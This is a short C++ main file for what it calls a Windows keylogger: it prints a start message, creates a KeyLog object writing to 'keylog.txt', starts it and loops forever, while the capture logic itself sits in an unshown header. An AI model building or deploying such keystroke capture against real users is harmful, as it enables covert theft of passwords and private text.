#include <iostream>
#include <windows.h>

#include "KeyLog.h"

int main() {
  try {
    std::cout << "Keylogger Starting" << std::endl;

    KeyLog keylogger("keylog.txt");
    keylogger.start();
    // keeping the thread active
    while (true) {
      // Sleep for 1s
      Sleep(1000);
    }
  } catch (const std::exception &e) {
    std::cerr << "Error" << e.what() << std::endl;
    return 1;
  }
}
